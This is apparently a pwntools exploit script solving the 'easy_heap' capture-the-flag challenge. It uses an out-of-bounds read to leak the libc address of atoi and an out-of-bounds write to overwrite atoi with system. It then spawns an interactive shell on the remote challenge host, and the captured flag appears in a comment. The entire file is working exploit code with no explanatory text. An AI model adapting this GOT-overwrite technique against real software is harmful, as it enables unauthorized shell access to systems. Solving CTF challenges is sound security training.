from pwn import *

def __init(name, age):
	r.sendlineafter('name: ', name)
	r.sendlineafter('age: ', str(age))
	return

def edit(idx, data):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter('Index: ', str(idx))
	r.sendlineafter('name: ', data)
	return

def leak(idx):
	r.sendlineafter('choice: ', '4')
	r.sendlineafter('Index: ', str(idx))
	r.recvuntil('is: ')
	return u32(r.recv(4))
	

def pwn():

	__init('kek', 21)

	# OOB read -- @-2826 => atoi
	libc   = leak(-2826) - 0x2d050
	system = libc + 0x3a940
	log.success("Libc: 0x{:x}".format(libc))
	# OOB write -- atoi => system
	edit(-2826, p64(system))

	r.sendline('sh')
	# AceBear{m4yb3_h34p_i5_3a5y_f0r_y0u}
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('easyheap.acebear.site', 3002)
        pwn()
    else:
        r = process('./easy_heap')
        pause()
        pwn()
